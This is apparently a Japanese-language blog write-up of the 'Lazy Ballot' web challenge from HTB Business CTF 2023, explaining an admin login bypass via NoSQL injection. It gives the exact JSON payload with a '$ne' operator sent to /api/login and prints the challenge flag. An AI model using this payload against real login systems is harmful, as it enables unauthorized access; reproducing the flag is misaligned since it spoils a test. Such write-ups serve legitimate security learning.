---
layout: post
title: "[Web] Lazy Ballot (300 pts, 383 solved)"
published : true
permalink: /ctf/writeups/HTB_Business_CTF_2023/Web_LazyBallot
tags: [CTF, WriteUps, HTB Business CTF]
---
## Description
As a Zenium State hacker, your mission is to breach Arodor's secure election system, subtly manipulating the results to create political chaos and destabilize their government, ultimately giving Zenium State an advantage in the global power struggle.

## Solution
ログイン画面でNoSQL injectionすることで、管理者でログインができる。

/api/login に対して以下のペイロードをPOSTする。

```
{
    "username":"admin",
    "password":{
        "$ne":"wrongpassword"
    }
}
```

管理画面にログインした後、最後のVotesのRegion欄にフラグがある。

Flag: `HTB{c0rrupt3d_c0uch_b4ll0t}`